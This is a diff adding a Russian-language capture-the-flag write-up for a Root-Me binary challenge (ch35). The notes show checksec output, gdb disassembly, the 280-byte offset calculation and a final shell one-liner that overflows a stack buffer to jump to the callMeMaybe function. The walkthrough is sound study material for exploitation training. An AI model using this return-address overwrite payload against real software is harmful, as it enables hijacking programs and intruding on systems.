@@ -1,0 +1,55 @@
+ssh -p 2223 app-systeme-ch35@challenge03.root-me.org
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable    FILE
+Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   64) Symbols       No    0               1     ./ch35
+
+ASLR is ON
+
+
+Строки не удалены, выясняем адресс callme сразу из gdb
+
+(gdb) info address callMeMaybe
+Symbol "callMeMaybe" is at 0x4005e7 in a file compiled without debugging.
+
+
+Смотрим дизасм:
+
+  0x0000000000400628 <+0>:     push   rbp
+   0x0000000000400629 <+1>:     mov    rbp,rsp
+   0x000000000040062c <+4>:     sub    rsp,0x120
+   0x0000000000400633 <+11>:    mov    DWORD PTR [rbp-0x114],edi
+   0x0000000000400639 <+17>:    mov    QWORD PTR [rbp-0x120],rsi
+   0x0000000000400640 <+24>:    lea    rax,[rbp-0x110]
+   0x0000000000400647 <+31>:    mov    rsi,rax
+   0x000000000040064a <+34>:    lea    rdi,[rip+0xd0]        # 0x400721
+   0x0000000000400651 <+41>:    mov    eax,0x0
+   0x0000000000400656 <+46>:    call   0x4004f0 <__isoc99_scanf@plt>
+ =>  0x000000000040065b <+51>:    lea    rax,[rbp-0x110]
+   0x0000000000400662 <+58>:    mov    rdi,rax
+   0x0000000000400665 <+61>:    call   0x4004c0 <strlen@plt>
+   0x000000000040066a <+66>:    mov    DWORD PTR [rbp-0x4],eax
+   0x000000000040066d <+69>:    lea    rax,[rbp-0x110]
+   0x0000000000400674 <+76>:    mov    rsi,rax
+   0x0000000000400677 <+79>:    lea    rdi,[rip+0xa6]        # 0x400724
+   0x000000000040067e <+86>:    mov    eax,0x0
+   0x0000000000400683 <+91>:    call   0x4004d0 <printf@plt>
+   0x0000000000400688 <+96>:    mov    eax,0x0
+   0x000000000040068d <+101>:   leave
+   0x000000000040068e <+102>:   ret
+
+
+видим что на стеке выделено 0x120, но буфер лежит в rbp-0x110, сканф кладет свой результат туда
+
+адрес возврата лежит в rbp+8: => расстояние между -110 и 8 = 118
+
+└─$ python3
+Python 3.13.7 (main, Aug 20 2025, 22:17:40) [GCC 14.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 0x118
+280
+
+смщение = 280
+2 * 8 int + 16 rbp + 256
+Пайлод выходит 
+
+app-systeme-ch35@challenge03:~$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*280 + b'\xe7\x05\x40\x00\x00\x00\x00\x00')"; cat) | ./ch35
